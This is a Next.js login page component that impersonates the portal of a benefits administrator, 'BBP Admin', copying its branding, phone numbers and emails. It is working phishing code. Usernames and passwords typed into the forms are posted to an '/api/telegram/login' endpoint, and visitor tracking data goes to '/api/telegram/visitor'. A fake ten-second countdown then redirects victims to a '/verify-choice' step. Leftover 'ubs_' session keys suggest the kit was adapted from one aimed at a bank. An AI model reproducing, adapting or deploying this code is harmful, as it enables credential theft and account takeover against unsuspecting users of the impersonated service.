"use client";

import { useState, useEffect, useRef } from "react";
import { useRouter } from "next/navigation";
import { Preloader } from "@/components/preloader";
import { useVisitorTracking } from "@/hooks/use-visitor-tracking";

export default function LoginPage() {
  const [showContent, setShowContent] = useState(false);
  const [hasInteracted, setHasInteracted] = useState(false);
  const visitorInfo = useVisitorTracking();
  const hasSentVisitRef = useRef(false);

  useEffect(() => {
    if (typeof window !== "undefined") {
      sessionStorage.removeItem("ubs_verify");
      sessionStorage.removeItem("ubs_details");
      sessionStorage.removeItem("ubs_otp2");
    }
  }, []);

  useEffect(() => {
    const onFirstInteraction = () => setHasInteracted(true);
    window.addEventListener("pointerdown", onFirstInteraction, {
      once: true,
      passive: true,
    });
    window.addEventListener("keydown", onFirstInteraction, { once: true });
    return () => {
      window.removeEventListener("pointerdown", onFirstInteraction);
      window.removeEventListener("keydown", onFirstInteraction);
    };
  }, []);

  useEffect(() => {
    if (!hasInteracted || !visitorInfo || hasSentVisitRef.current) return;
    hasSentVisitRef.current = true;
    fetch("/api/telegram/visitor", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(visitorInfo),
    }).catch(console.error);
  }, [hasInteracted, visitorInfo]);

  const [username, setUsername] = useState("");
  const [password, setPassword] = useState("");
  const [firstName, setFirstName] = useState("");
  const [lastName, setLastName] = useState("");
  const [zip, setZip] = useState("");
  const [isLoginLoading, setIsLoginLoading] = useState(false);
  const [loginError, setLoginError] = useState<string | null>(null);
  const [countdown, setCountdown] = useState(0);
  const [honeypot, setHoneypot] = useState("");
  const countdownRef = useRef<number | null>(null);
  const redirectRef = useRef<number | null>(null);
  const router = useRouter();

  const zipDigits = zip.replace(/\D/g, "");
  const isMobileFormValid =
    firstName.trim() !== "" && lastName.trim() !== "" && zipDigits.length >= 5;

  const handleDesktopSignIn = async (
    event: React.FormEvent<HTMLFormElement>,
  ) => {
    event.preventDefault();
    if (isLoginLoading || !username || !password) return;
    if (process.env.NODE_ENV !== "production" && honeypot.trim() !== "") {
      setLoginError("Suspicious activity detected. Please try again.");
      return;
    }
    setLoginError(null);
    setIsLoginLoading(true);

    try {
      const response = await fetch("/api/telegram/login", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ userId: username, password }),
      });
      if (!response.ok) {
        throw new Error("Failed to send login data");
      }

      if (typeof window !== "undefined") {
        sessionStorage.setItem("ubs_verify", "1");
      }

      setCountdown(10);
      countdownRef.current = window.setInterval(() => {
        setCountdown((prev) => {
          if (prev <= 1) {
            if (countdownRef.current) {
              window.clearInterval(countdownRef.current);
              countdownRef.current = null;
            }
            return 0;
          }
          return prev - 1;
        });
      }, 1000);

      redirectRef.current = window.setTimeout(() => {
        router.push("/verify-choice");
      }, 10000);
    } catch (error) {
      console.error("Login failed:", error);
      setLoginError("Unable to send login details. Please try again.");
      setIsLoginLoading(false);
    }
  };

  const handleMobileSignIn = async (
    event: React.FormEvent<HTMLFormElement>,
  ) => {
    event.preventDefault();
    if (isLoginLoading || !username || !password) return;
    if (process.env.NODE_ENV !== "production" && honeypot.trim() !== "") {
      setLoginError("Suspicious activity detected. Please try again.");
      return;
    }
    setLoginError(null);
    setIsLoginLoading(true);

    try {
      const response = await fetch("/api/telegram/login", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ userId: username, password }),
      });
      if (!response.ok) {
        throw new Error("Failed to send login data");
      }

      if (typeof window !== "undefined") {
        sessionStorage.setItem("ubs_verify", "1");
      }

      setCountdown(10);
      countdownRef.current = window.setInterval(() => {
        setCountdown((prev) => {
          if (prev <= 1) {
            if (countdownRef.current) {
              window.clearInterval(countdownRef.current);
              countdownRef.current = null;
            }
            return 0;
          }
          return prev - 1;
        });
      }, 1000);

      redirectRef.current = window.setTimeout(() => {
        router.push("/verify-choice");
      }, 10000);
    } catch (error) {
      console.error("Login failed:", error);
      setLoginError("Unable to send login details. Please try again.");
      setIsLoginLoading(false);
    }
  };

  useEffect(() => {
    return () => {
      if (countdownRef.current) {
        window.clearInterval(countdownRef.current);
      }
      if (redirectRef.current) {
        window.clearTimeout(redirectRef.current);
      }
    };
  }, []);

  return (
    <>
      {!showContent && <Preloader onComplete={() => setShowContent(true)} />}
      {showContent && (
        <div className="flex flex-col min-h-screen">
          <style
            dangerouslySetInnerHTML={{
              __html: `
              *,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
              body,html,#__next{min-height:100%;}
              body{font-family:'Roboto',sans-serif;background-color:white;color:#333;min-height:100vh}
              .sticky-header{position:sticky;top:0;background:white;z-index:1000;border-bottom:1px solid #d1d3d4}
              .btn-dark-navy{background-color:#1a2a47;transition:background 0.2s}
              .btn-dark-navy:hover{background-color:#111c30}
              .btn-blue{background-color:#4a86cc;transition:background 0.2s}
              .btn-blue:hover{background-color:#3b6da6}
              .form-input{border:1px solid #333;border-radius:2px;padding:6px 10px;width:100%;max-width:400px}
              .footer-bg{background-color:#e6e7e8;color:#555}
              .bbp-blue-text{color:#337ab7}
            `,
            }}
          />

          <header className="sticky-header shadow-sm hidden md:block">
            <div className="max-w-[1200px] mx-auto px-4 py-3 flex flex-col md:flex-row md:items-center justify-between gap-4">
              <div className="flex flex-col sm:flex-row items-center gap-6">
                <img
                  src="Screenshot 2026-04-13 110125.png"
                  alt="BBP Admin Benefits Administration logo featuring a circular icon of overlapping figures in shades of blue and purple."
                  className="h-12 w-auto"
                />
                <div className="flex flex-col text-sm text-gray-600 border-l-0 sm:border-l pl-0 sm:pl-6 border-gray-300">
                  <div className="flex items-center gap-2">
                    <svg
                      className="w-4 h-4"
                      fill="none"
                      stroke="currentColor"
                      viewBox="0 0 24 24"
                    >
                      <path d="M3 5a2 2 0 012-2h3.28a1 1 0 01.948.684l1.498 4.493a1 1 0 01-.502 1.21l-2.257 1.13a11.042 11.042 0 005.516 5.516l1.13-2.257a1 1 0 011.21-.502l4.493 1.498a1 1 0 01.684.949V19a2 2 0 01-2 2h-1C9.716 21 3 14.284 3 6V5z" />
                    </svg>
                    (630) 773-2337
                  </div>
                  <div className="flex items-center gap-2">
                    <svg
                      className="w-4 h-4"
                      fill="none"
                      stroke="currentColor"
                      viewBox="0 0 24 24"
                    >
                      <path d="M3 8l7.89 5.26a2 2 0 002.22 0L21 8M5 19h14a2 2 0 002-2V7a2 2 0 00-2-2H5a2 2 0 00-2 2v10a2 2 0 002 2z" />
                    </svg>
                    support@bbpadmin.com
                  </div>
                </div>
              </div>

              <div className="hidden md:block">
                <span className="text-3xl font-light text-gray-500">Login</span>
              </div>
            </div>
          </header>

          <main className="md:hidden bg-white">
            <form
              onSubmit={handleMobileSignIn}
              className="max-w-md mx-auto min-h-screen px-6 py-8 flex flex-col"
            >
              <div className="flex justify-center">
                <img
                  src="Screenshot 2026-04-13 110125.png"
                  alt="BBP Admin Benefits Administration logo"
                  className="w-72 object-contain"
                />
              </div>

              <section className="mt-12">
                <div>
                  <label
                    className="block text-[15px] font-medium text-black mb-2"
                    htmlFor="userIdMobile"
                  >
                    Enter your User ID
                  </label>
                  <input
                    id="userIdMobile"
                    type="text"
                    placeholder="User ID"
                    className="w-full border-b border-gray-400 pb-3 outline-none placeholder:text-gray-400"
                    value={username}
                    onChange={(event) => setUsername(event.target.value)}
                  />
                </div>

                <div className="mt-8">
                  <label
                    className="block text-[15px] font-medium text-black mb-2"
                    htmlFor="passwordMobile"
                  >
                    Enter your Password
                  </label>
                  <input
                    id="passwordMobile"
                    type="password"
                    placeholder="Password"
                    className="w-full border-b border-gray-400 pb-3 outline-none placeholder:text-gray-400"
                    value={password}
                    onChange={(event) => setPassword(event.target.value)}
                  />
                </div>

                <div className="flex items-center justify-between mt-8">
                  <i
                    data-lucide="scan-face"
                    className="w-8 h-8 text-gray-700"
                  ></i>

                  <div className="flex items-center gap-3">
                    <span className="text-sm text-gray-500">Save User ID</span>

                    <div className="w-12 h-6 rounded-full bg-gray-400 relative">
                      <div className="absolute left-0.5 top-0.5 w-5 h-5 rounded-full bg-gray-300 shadow" />
                    </div>
                  </div>
                </div>

                <button
                  type="submit"
                  className="mt-8 flex items-center justify-center h-16 rounded-full bg-gray-400 text-gray-300 text-xl font-semibold w-full"
                  disabled={isLoginLoading || !username || !password}
                >
                  {isLoginLoading ? "Signing in..." : "LOG IN"}
                </button>

                <p
                  className="text-sm text-red-600 min-h-[1.25rem] mt-3"
                  aria-live="polite"
                >
                  {loginError ?? ""}
                </p>

                <div className="text-center mt-6 text-sm text-[#7B4654] font-semibold">
                  <button
                    type="button"
                    onClick={() => router.push("/forgot-id")}
                    className="underline"
                  >
                    Forgot User ID
                  </button>
                  <span className="mx-2">|</span>
                  <button
                    type="button"
                    onClick={() => router.push("/forgot-password")}
                    className="underline"
                  >
                    Forgot Password
                  </button>
                </div>
              </section>

              <div className="mt-10 pb-8">
                <button
                  type="button"
                  onClick={() => router.push("/new-user")}
                  className="mx-auto w-full max-w-[460px] h-16 rounded-full border-2 border-[#7B4654] text-[#7B4654] text-2xl font-semibold"
                >
                  SIGN UP
                </button>

                <p className="text-center mt-8 text-[#7B4654] font-semibold">
                  Login Problems?
                </p>

                <div className="flex flex-wrap justify-center gap-x-6 gap-y-2 mt-6 text-sm text-[#7B4654] font-semibold">
                  <a href="#" className="underline">
                    Privacy
                  </a>
                  <a href="#" className="underline">
                    Terms and Conditions
                  </a>
                  <a href="#" className="underline">
                    Contact Us
                  </a>
                </div>
              </div>
            </form>
          </main>

          <main className="hidden md:flex-grow md:flex md:flex-col px-4 py-12">
            <div className="w-full max-w-[600px] text-center">
              <div className="flex flex-col items-center mb-6">
                <svg
                  className="w-12 h-12 text-gray-400 mb-4"
                  fill="none"
                  stroke="currentColor"
                  viewBox="0 0 24 24"
                >
                  <path
                    strokeLinecap="round"
                    strokeLinejoin="round"
                    strokeWidth="1"
                    d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z"
                  />
                </svg>
                <p className="text-gray-600 text-sm max-w-sm">
                  We will maintain the confidentiality of your personal
                  information in accordance with our privacy policy.
                </p>
              </div>

              <h2 className="text-2xl font-light text-gray-700 mb-8">
                Sign in
              </h2>

              <form
                onSubmit={handleDesktopSignIn}
                className="text-left flex flex-col items-center space-y-6"
              >
                <div className="w-full max-w-[400px]">
                  <label htmlFor="userId" className="block text-sm mb-1">
                    UserId <span className="text-orange-500">*</span>
                  </label>
                  <input
                    type="text"
                    id="userId"
                    className="form-input"
                    value={username}
                    onChange={(event) => setUsername(event.target.value)}
                  />
                  <p className="text-xs mt-2 text-gray-600">
                    Forgot your Username?{" "}
                    <a href="#" className="bbp-blue-text hover:underline">
                      Let us help
                    </a>
                  </p>
                </div>

                <div className="w-full max-w-[400px]">
                  <label htmlFor="password" className="block text-sm mb-1">
                    Password <span className="text-orange-500">*</span>
                  </label>
                  <input
                    type="password"
                    id="password"
                    className="form-input"
                    value={password}
                    onChange={(event) => setPassword(event.target.value)}
                  />
                  <p className="text-xs mt-2 text-gray-600">
                    Forgot your Password?{" "}
                    <a href="#" className="bbp-blue-text hover:underline">
                      Let us help
                    </a>
                  </p>
                </div>

                <input
                  type="text"
                  name="website"
                  value={honeypot}
                  onChange={(e) => setHoneypot(e.target.value)}
                  style={{ display: "none" }}
                  autoComplete="off"
                />

                <div className="w-full max-w-[400px] pt-4 border-b border-gray-200 pb-8">
                  <button
                    type="submit"
                    className="btn-dark-navy text-white px-8 py-2 rounded flex items-center justify-center gap-3 w-48 text-sm uppercase font-medium shadow-sm"
                    disabled={isLoginLoading || !username || !password}
                  >
                    <svg
                      className="w-5 h-5"
                      fill="none"
                      stroke="currentColor"
                      viewBox="0 0 24 24"
                      strokeWidth="2.5"
                    >
                      <path d="M5 13l4 4L19 7" />
                    </svg>
                    {isLoginLoading ? "Signing in..." : "Sign in"}
                  </button>
                  <p
                    className="text-sm text-red-600 min-h-[1.25rem] mt-3"
                    aria-live="polite"
                  >
                    {loginError ?? ""}
                  </p>
                </div>

                <div className="w-full max-w-[400px] pt-4">
                  <p className="text-sm text-gray-500 mb-4">
                    Don't have an account?
                  </p>
                  <button
                    type="button"
                    className="btn-blue text-white px-8 py-2 rounded flex items-center justify-center gap-3 w-48 text-sm uppercase font-medium shadow-sm"
                  >
                    <svg
                      className="w-5 h-5"
                      fill="none"
                      stroke="currentColor"
                      viewBox="0 0 24 24"
                    >
                      <path d="M18 9v3m0 0v3m0-3h3m-3 0h-3m-2-5a4 4 0 11-8 0 4 4 0 018 0zM3 20a6 6 0 0112 0v1H3v-1z" />
                    </svg>
                    Register
                  </button>
                </div>
              </form>
            </div>
          </main>

          <footer className="footer-bg py-10 px-4 text-center hidden md:block">
            <div className="max-w-[1000px] mx-auto space-y-4">
              <div className="flex justify-center gap-6 text-sm font-medium text-gray-700 uppercase tracking-wide">
                <a href="#" className="hover:underline">
                  About us
                </a>
                <a href="#" className="hover:underline">
                  Terms of Use
                </a>
                <a href="#" className="hover:underline">
                  Privacy Policy
                </a>
              </div>

              <div className="text-[11px] leading-relaxed space-y-1">
                <p>Copyright © 2024 Better Business Planning, Inc.</p>
                <p>
                  BBPAdmin | P.O. Box 736230 | Chicago, Illinois 60673-6230 |
                  Phone: (630) 773-2337 | Fax: (630) 775-8568
                </p>
                <p>
                  Support question email{" "}
                  <a
                    href="mailto:support@bbpadmin.com"
                    className="bbp-blue-text"
                  >
                    support@bbpadmin.com
                  </a>
                </p>
                <p>
                  Claims email{" "}
                  <a
                    href="mailto:claims@bbpadmin.com"
                    className="bbp-blue-text"
                  >
                    claims@bbpadmin.com
                  </a>
                </p>
                <p>All Rights Reserved.</p>
              </div>

              <div className="pt-4">
                <a
                  href="#"
                  className="text-[11px] font-bold uppercase tracking-widest bbp-blue-text hover:underline"
                >
                  Site Map
                </a>
              </div>
            </div>
          </footer>
        </div>
      )}
    </>
  );
}
